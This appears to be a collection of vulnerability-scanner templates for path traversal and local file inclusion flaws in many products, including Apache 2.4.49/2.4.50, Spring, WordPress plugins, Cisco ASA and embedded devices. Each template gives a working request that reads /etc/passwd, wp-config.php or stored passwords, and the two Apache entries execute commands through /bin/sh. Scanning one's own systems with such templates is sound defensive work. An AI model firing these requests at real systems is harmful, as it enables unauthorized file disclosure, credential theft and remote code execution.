# Groupoffice 3.4.21 - Local File Inclusion

## Description

- Groupoffice 3.4.21 is vulnerable to local file inclusion.
- severity - high
- tags - groupoffice,lfi,traversal

## Requests

- Method - GET

### URL

- {{BaseURL}}/compress.php?file=../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# Asanhamayesh CMS 3.4.6 - Local File Inclusion

## Description

- Asanhamayesh CMS 3.4.6 is vulnerable to local file inclusion.
- severity - high
- tags - asanhamayesh,lfi,traversal

## Requests

- Method - GET

### URL

- {{BaseURL}}/downloadfile.php?file=../../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# Global Domains International - Local File Inclusion

## Description

- Global Domains International is vulnerable to local file inclusion.
- severity - high
- tags - globaldomains,lfi,traversal

## Requests

- Method - GET

### URL

- {{BaseURL}}/kvmlm2/index.dhtml?fname=&language=../../../../../../../../../../etc/passwd%00.jpg&lname=&sponsor=gdi&template=11

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# Kingdee EAS - Local File Inclusion

## Description

- Kingdee EAS OA server_file is vulnerable to local file inclusion and can allow attackers to obtain sensitive server information.
- severity - high
- tags - kingdee,lfi,traversal

## Requests

- Method - GET

### URL

- {{BaseURL}}/appmonitor/protected/selector/server_file/files?folder=C://&suffix=
- {{BaseURL}}/appmonitor/protected/selector/server_file/files?folder=/&suffix=

### Matchers

**Type - word**

- part - body
- words
  1. {"name":"Windows","path":"C:\\\\Windows","folder":true}
  2. {"name":"root","path":"/root","folder":true}
- condition - or

**Type - word**

- words
  1. application/json
- part - header

**Type - status**

- status
  1. 200

---

# Carel pCOWeb HVAC BACnet Gateway 2.1.0 - Local File Inclusion

## Description

- Carel pCOWeb HVAC BACnet Gateway 2.1.0 is vulnerable to local file inclusion because of input passed through the 'file' GET parameter through the 'logdownload.cgi' Bash script is not properly verified before being used to download log files. This can be exploited to disclose the contents of arbitrary and sensitive files via directory traversal attacks.
- severity - high
- tags - carel,lfi,traversal,unauth,bacnet

## Requests

- Method - GET

### URL

- {{BaseURL}}/usr-cgi/logdownload.cgi?file=../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

---

# Spring Cloud Config Server - Local File Inclusion

## Description

- Spring Cloud Config Server versions 2.2.x prior to 2.2.3, versions 2.1.x prior to 2.1.9, and older unsupported versions allow applications to serve arbitrary configuration files through the spring-cloud-config-server module. A malicious user or attacker can send a request using a specially crafted URL that can lead to a local file inclusion attack.
- severity - high
- tags - cve,cve2020,lfi,springcloud,config,traversal,kev

## Requests

- Method - GET

### URL

- {{BaseURL}}/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Onkyo TX-NR585 Web Interface - Directory Traversal

## Description

- Onkyo TX-NR585 1000-0000-000-0008-0000 devices allows remote unauthenticated users on the network to read sensitive files via %2e%2e%2f directory traversal and local file inclusion.
- severity - high
- tags - cve,cve2020,onkyo,lfi,traversal

## Requests

- Method - GET

### URL

- {{BaseURL}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# Microstrategy Web 7 - Local File Inclusion

## Description

- Microstrategy Web 7 is vulnerable to local file inclusion via "/WebMstr7/servlet/mstrWeb" (in the parameter subpage). Remote authenticated users can bypass intended SecurityManager restrictions and list a parent directory via a /.. (slash dot dot) in a pathname used by a web application. NOTE: this is a deprecated product.

- severity - medium
- tags - traversal,edb,packetstorm,cve,cve2018,microstrategy,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/WebMstr7/servlet/mstrWeb?evt=3045&src=mstrWeb.3045&subpage=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Spring MVC Framework - Local File Inclusion

## Description

- Spring MVC Framework versions 5.0 prior to 5.0.5 and versions 4.3 prior to 4.3.15 and older unsupported are vulnerable to local file inclusion because they allow applications to configure Spring MVC to serve static resources (e.g. CSS, JS, images). A malicious user can send a request using a specially crafted URL that can lead a directory traversal attack.
- severity - medium
- tags - cve,cve2018,spring,lfi,traversal

## Requests

- Method - GET

### URL

- {{BaseURL}}/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
- {{BaseURL}}/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini

### Matchers

**Type - word**

- words
  1. for 16-bit app support

**Type - status**

- status
  1. 200

---

# WordPress 99 Robots WP Background Takeover Advertisements \<=4.1.4 - Local File Inclusion

## Description

- WordPress 99 Robots WP Background Takeover Advertisements 4.1.4 is susceptible to local file inclusion via exports/download.php.

- severity - high
- tags - edb,cve,cve2018,wordpress,wp-plugin,lfi,traversal,wp

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/wpsite-background-takeover/exports/download.php?filename=../../../../wp-config.php

### Matchers

**Type - word**

- part - body
- words
  1. DB_NAME
  2. DB_PASSWORD
  3. DB_HOST
  4. The base configurations of the WordPress
- condition - and

---

# Cisco ASA - Local File Inclusion

## Description

- Cisco Adaptive Security Appliances (ASA) web interfaces could allow an unauthenticated, remote attacker to cause an affected device to reload unexpectedly, resulting in a denial of service (DoS) condition. It is also possible on certain software releases that the ASA will not reload, but an attacker could view sensitive system information without authentication by using directory traversal techniques. The vulnerability is due to lack of proper input validation of the HTTP URL. An attacker could exploit this vulnerability by sending a crafted HTTP request to an affected device. An exploit could allow the attacker to cause a DoS condition or unauthenticated disclosure of information. This vulnerability applies to IPv4 and IPv6 HTTP traffic. This vulnerability affects Cisco ASA Software and Cisco Firepower Threat Defense (FTD) Software that is running on the following Cisco products: 3000 Series Industrial Security Appliance (ISA), ASA 1000V Cloud Firewall, ASA 5500 Series Adaptive Security Appliances, ASA 5500-X Series Next-Generation Firewalls, ASA Services Module for Cisco Catalyst 6500 Series Switches and Cisco 7600 Series Routers, Adaptive Security Virtual Appliance (ASAv), Firepower 2100 Series Security Appliance, Firepower 4100 Series Security Appliance, Firepower 9300 ASA Security Module, FTD Virtual (FTDv). Cisco Bug IDs: CSCvi16029.

- severity - high
- tags - edb,cve,cve2018,cisco,lfi,traversal,asa,kev

## Requests

- Method - GET

### URL

- {{BaseURL}}/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions

### Matchers

**Type - word**

- part - body
- words
  1. ///sessions

**Type - status**

- status
  1. 200

---

# JSmol2WP \<= 1.07 - Directory Traversal

## Description

- An issue was discovered in the JSmol2WP plugin 1.07 for WordPress. There is an arbitrary file read vulnerability via ../ directory traversal in query=php://filter/resource= in the jsmol.php query string. This can also be used for SSRF.

- severity - high
- tags - wp,wp-plugin,wordpress,jsmol2wp,wpscan,cve,cve2018,traversal

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php

### Matchers

**Type - word**

- part - body
- words
  1. 'DB_USER',
  2. 'DB_PASSWORD'
- condition - and

**Type - word**

- part - header
- words
  1. text/plain

**Type - status**

- status
  1. 200

---

# LG-Ericsson iPECS NMS 30M - Local File Inclusion

## Description

- Ericsson-LG iPECS NMS 30M allows local file inclusion via ipecs-cm/download?filename=../ URIs.
- severity - high
- tags - cve,cve2018,ericsson,lfi,traversal,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/ipecs-cm/download?filename=../../../../../../../../../../etc/passwd&filepath=/home/wms/www/data
- {{BaseURL}}/ipecs-cm/download?filename=jre-6u13-windows-i586-p.exe&filepath=../../../../../../../../../../etc/passwd%00.jpg

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# Nextjs \<2.4.1 - Local File Inclusion

## Description

- ZEIT Next.js before 2.4.1 is susceptible to local file inclusion via the /\_next and /static request namespace, allowing attackers to obtain sensitive information.
- severity - high
- tags - cve,cve2017,nextjs,lfi,traversal

## Requests

- Method - GET

### URL

- {{BaseURL}}/\_next/../../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body
- condition - and

**Type - status**

- status
  1. 200

---

# SAP NetWeaver Application Server Java 7.5 - Local File Inclusion

## Description

- SAP NetWeaver Application Server Java 7.5 is susceptible to local file inclusion in scheduler/ui/js/ffffffffbca41eb4/UIUtilJavaScriptJS. This can allow remote attackers to read arbitrary files via a .. (dot dot) in the query string, as exploited in the wild in August 2017, aka SAP Security Note 2486657.
- severity - high
- tags - cve,cve2017,sap,lfi,java,traversal

## Requests

- Method - GET

### URL

- {{BaseURL}}/scheduler/ui/js/ffffffffbca41eb4/UIUtilJavaScriptJS?/..

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. WEB-INF
  2. META-INF
- condition - and
- part - body

---

# Ulterius Server \< 1.9.5.0 - Directory Traversal

## Description

- Ulterius Server before 1.9.5.0 allows HTTP server directory traversal via the process function in RemoteTaskServer/WebServer/HttpServer.cs.
- severity - high
- tags - cve2017,ulterius,traversal,edb,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/.../.../.../.../.../.../.../.../.../windows/win.ini
- {{BaseURL}}/.../.../.../.../.../.../.../.../.../etc/passwd

### Matchers

**Type - status**

- status
  1. 200

**Type - regex**

- regex
  1. root:.\*:0:0:
  2. \[(font|extension|file)s\]
- condition - or
- part - body

---

# Belkin N150 Router 1.00.08/1.00.09 - Path Traversal

## Description

- A path traversal vulnerability in the webproc cgi module on the Belkin N150 F9K1009 v1 router with firmware before 1.00.08 allows remote attackers to read arbitrary files via a full pathname in the getpage parameter.
- severity - high
- tags - cve,cve2014,lfi,router,firmware,traversal

## Requests

- Method - GET

### URL

- {{BaseURL}}/cgi-bin/webproc?getpage=/etc/passwd&var:page=deviceinfo

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# nweb2fax \<=0.2.7 - Local File Inclusion

## Description

- nweb2fax 0.2.7 and earlier allow remote attackers to read arbitrary files via the id parameter submitted to comm.php and the var_filename parameter submitted to viewrq.php.
- severity - high
- tags - cve2008,nweb2fax,lfi,traversal,edb,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/comm.php?id=../../../../../../../../../../etc/passwd
- {{BaseURL}}/viewrq.php?format=ps&var_filename=../../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# kkFileview v4.0.0 - Directory Traversal

## Description

- kkFileview v4.0.0 has arbitrary file read through a directory traversal vulnerability which may lead to sensitive file leak on related host.

- severity - high
- tags - cve,cve2021,kkfileview,traversal

## Requests

- Method - GET

### URL

- {{BaseURL}}/getCorsFile?urlPath=file:///etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# GLPI plugin Barcode \< 2.6.1 - Path Traversal Vulnerability.

## Description

- Barcode is a GLPI plugin for printing barcodes and QR codes. GLPI instances version 2.x prior to version 2.6.1 with the barcode plugin installed are vulnerable to a path traversal vulnerability.
- severity - high
- tags - glpi,cve,cve2021,lfi,plugin,traversal

## Requests

- Method - GET

### URL

- {{BaseURL}}/glpi/plugins/barcode/front/send.php?file=../../../../../../../../etc/passwd

### Matchers

**Type - status**

- status
  1. 200

**Type - regex**

- regex
  1. root:.\*:0:0:

---

# Hongdian H8922 3.0.5 Devices - Local File Inclusion

## Description

- Hongdian H8922 3.0.5 devices are vulnerable to local file inclusion. The /log_download.cgi log export handler does not validate user input and allows a remote attacker with minimal privileges to download any file from the device by substituting ../ (e.g., ../../etc/passwd) This can be carried out with a web browser by changing the file name accordingly. Upon visiting log_download.cgi?type=../../etc/passwd and logging in, the web server will allow a download of the contents of the /etc/passwd file.

- severity - medium
- tags - cve,cve2021,hongdian,traversal

## Requests

### Step - 1

```
GET /log_download.cgi?type=../../etc/passwd HTTP/1.1
Host: {{Hostname}}
Cache-Control: max-age=0
Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=

```

### Step - 2

```
GET /log_download.cgi?type=../../etc/passwd HTTP/1.1
Host: {{Hostname}}
Authorization: Basic YWRtaW46YWRtaW4=

```

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. application/octet-stream
- part - header

**Type - regex**

- regex
  1. root:.\*:0:0:
  2. sshd:[x*]
  3. root:[$]
- part - body

---

# ECOA Building Automation System - Directory Traversal Content Disclosure

## Description

- The ECOA BAS controller suffers from a directory traversal content disclosure vulnerability. Using the GET parameter cpath in File Manager (fmangersub), attackers can disclose directory content on the affected device
- severity - high
- tags - cve,cve2021,ecoa,lfi,traversal

## Requests

### Step - 1

```
GET /fmangersub?cpath=../../../../../../../etc/passwd HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

---

# Apache 2.4.49 - Path Traversal and Remote Code Execution

## Description

- A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack to map URLs to files outside the expected document root. If files outside of the document root are not protected by "require all denied" these requests can succeed. Additionally, this flaw could leak the source of interpreted files like CGI scripts. This issue is known to be exploited in the wild. This issue only affects Apache 2.4.49 and not earlier versions.
- severity - high
- tags - cve,cve2021,lfi,rce,apache,misconfig,traversal,kev

## Requests

### Step - 1

```
GET /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
Host: {{Hostname}}

```

### Step - 2

```
POST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

echo Content-Type: text/plain; echo; {{cmd}}

```

### Matchers

**Type - regex**

- name - LFI
- regex
  1. root:.\*:0:0:

**Type - word**

- name - RCE
- words
  1. CVE-2021-41773-POC

---

# Rstudio Shiny Server \<1.5.16 - Local File Inclusion

## Description

- Rstudio Shiny Server prior to 1.5.16 is vulnerable to local file inclusion and source code leakage. This can be exploited by appending an encoded slash to the URL.
- severity - medium
- tags - cve,cve2021,rstudio,traversal

## Requests

- Method - GET

### URL

- {{BaseURL}}/%2f/
- {{BaseURL}}/sample-apps/hello/%2f/

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. Index of /

**Type - regex**

- part - body
- regex
  1. [A-Za-z].\*\.R

---

# Ivanti Avalanche 6.3.2 - Local File Inclusion

## Description

- Ivanti Avalanche 6.3.2 is vulnerable to local file inclusion because it allows remote unauthenticated user to access files that reside outside the 'image' folder.
- severity - high
- tags - cve,cve2021,avalanche,traversal,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/AvalancheWeb/image?imageFilePath=C:/windows/win.ini

### Matchers

**Type - word**

- part - body
- words
  1. for 16-bit app support

**Type - status**

- status
  1. 200

---

# Apache 2.4.49/2.4.50 - Path Traversal and Remote Code Execution

## Description

- A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49 and 2.4.50. An attacker could use a path traversal attack to map URLs to files outside the expected document root. If files outside of the document root are not protected by "require all denied" these requests can succeed. Additionally, this flaw could leak the source of interpreted files like CGI scripts. In certain configurations, for instance if mod_cgi is enabled, this flaw can lead to remote code execution. This issue only affects Apache 2.4.49 and 2.4.50 and not earlier versions. Note - CVE-2021-42013 is due to an incomplete fix for the original vulnerability CVE-2021-41773.

- severity - critical
- tags - cve,cve2021,lfi,apache,rce,misconfig,traversal,kev

## Requests

### Step - 1

```
GET /icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}


```

### Step - 2

```
GET /icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}


```

### Step - 3

```
POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}
Content-Type: application/x-www-form-urlencoded

echo Content-Type: text/plain; echo; {{cmd}}


```

### Matchers

**Type - regex**

- name - LFI
- regex
  1. root:.\*:0:0:

**Type - word**

- name - RCE
- words
  1. CVE-2021-42013

---

# BlogEngine.NET 3.3.7.0 - Local File Inclusion

## Description

- BlogEngine.NET 3.3.7.0 allows /api/filemanager local file inclusion via the path parameter

- severity - high
- tags - cve,cve2019,blogengine,lfi,traversal

## Requests

- Method - GET

### URL

- {{BaseURL}}/api/filemanager?path=%2F..%2f..%2fContent

### Matchers

**Type - regex**

- regex
  1. ~/App_Data/files/../../([a-zA-Z0-9\.\-]+)/([a-z0-9]+)

**Type - word**

- part - header
- words
  1. application/json

**Type - status**

- status
  1. 200

---

# OpenEMR 4.1 - Local File Inclusion

## Description

- Multiple directory traversal vulnerabilities in OpenEMR 4.1.0 allow remote authenticated users to read arbitrary files via a .. (dot dot) in the formname parameter to (1) contrib/acog/print_form.php; or (2) load_form.php, (3) view_form.php, or (4) trend_form.php in interface/patient_file/encounter.
- severity - high
- tags - lfi,openemr,traversal,edb,cve,cve2012

## Requests

- Method - GET

### URL

- {{BaseURL}}/contrib/acog/print_form.php?formname=../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Dolibarr ERP/CRM 3.2 Alpha - Multiple Directory Traversal Vulnerabilities

## Description

- Multiple directory traversal vulnerabilities in Dolibarr CMS 3.2.0 Alpha allow remote attackers to read arbitrary files and possibly execute arbitrary code via a .. (dot dot) in the (1) file parameter to document.php or (2) backtopage parameter in a create action to comm/action/fiche.php.
- severity - high
- tags - cve,cve2012,lfi,dolibarr,traversal,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/document.php?modulepart=project&file=../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Count Per Day \<= 3.1 - download.php f Parameter Traversal Arbitrary File Access

## Description

- An absolute path traversal vulnerability in download.php in the Count Per Day module before 3.1.1 for WordPress allows remote attackers to read arbitrary files via the f parameter.
- severity - high
- tags - packetstorm,cve,cve2012,lfi,wordpress,wp-plugin,traversal

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/count-per-day/download.php?n=1&f=/etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# FlatnuX CMS - Directory Traversal

## Description

- A path traversal vulnerability in controlcenter.php in FlatnuX CMS 2011 08.09.2 allows remote administrators to read arbitrary files via a full pathname in the dir parameter in a contents/Files action.
- severity - high
- tags - cve2012,lfi,traversal,edb,packetstorm,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/controlcenter.php?opt=contents/Files&dir=%2Fetc&ffile=passwd&opmod=open

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# UniSharp aka Laravel Filemanager v2.5.1 - Directory Traversal

## Description

- UniSharp laravel-filemanager (aka Laravel Filemanager) through 2.5.1 allows download?working_dir=%2F.. directory traversal to read arbitrary files.

- severity - medium
- tags - cve,cve2022,laravel,unisharp,lfi,traversal

## Requests

- Method - GET

### URL

- {{BaseURL}}/download?working_dir=%2F../../../../../../../../../../../../../../../../../../../etc&type=Files&file=passwd
- {{BaseURL}}/laravel-filemanager/download?working_dir=%2F../../../../../../../../../../../../../../../../../../../etc&type=Files&file=passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

---

# Omnia MPX 1.5.0+r1 - Path Traversal

## Description

- A local file disclosure vulnerability in /appConfig/userDB.json of Telos Alliance Omnia MPX Node through 1.5.0+r1 allows attackers to escalate privileges to root and execute arbitrary commands.

- severity - critical
- tags - traversal,omnia,edb,cve,cve2022,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/logs/downloadMainLog?fname=../../../../../../..//etc/passwd
- {{BaseURL}}/logs/downloadMainLog?fname=../../../../../../..///config/MPXnode/www/appConfig/userDB.json

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - word**

- part - body
- words
  1. "username":
  2. "password":
  3. "mustChangePwd":
  4. "roleUser":
- condition - and

---

# Cisco Linksys WVC54GCA 1.00R22/1.00R24 - Local File Inclusion

## Description

- Cisco Linksys WVC54GCA 1.00R22/1.00R24 is susceptible to local file inclusion in adm/file.cgi because it allows remote attackers to read arbitrary files via a %2e. (encoded dot dot) or an absolute pathname in the next_file parameter.
- severity - high
- tags - cve,iot,linksys,camera,traversal,cve2009,lfi,cisco,firmware,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/adm/file.cgi?next_file=%2fetc%2fpasswd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Horde/Horde Groupware - Local File Inclusion

## Description

- Horde before 3.2.4 and 3.3.3 and Horde Groupware before 1.1.5 are susceptible to local file inclusion in framework/Image/Image.php because it allows remote attackers to include and execute arbitrary local files via directory traversal sequences in the Horde_Image driver name.
- severity - high
- tags - cve,cve2009,horde,lfi,traversal,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/horde/util/barcode.php?type=../../../../../../../../../../../etc/./passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---
